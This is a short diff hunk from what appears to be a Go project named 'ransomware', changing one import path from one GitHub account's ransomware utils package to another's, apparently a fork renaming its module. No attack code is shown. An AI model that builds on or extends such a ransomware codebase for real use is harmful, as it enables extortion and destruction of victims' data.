@@ -16,7 +16,7 @@ import (
 	"strings"
 	"syscall"
 
-	"github.com/mauri870/ransomware/utils"
+	"github.com/Cyb3rM0nk3y/ransomware/utils"
 )
 
 const (
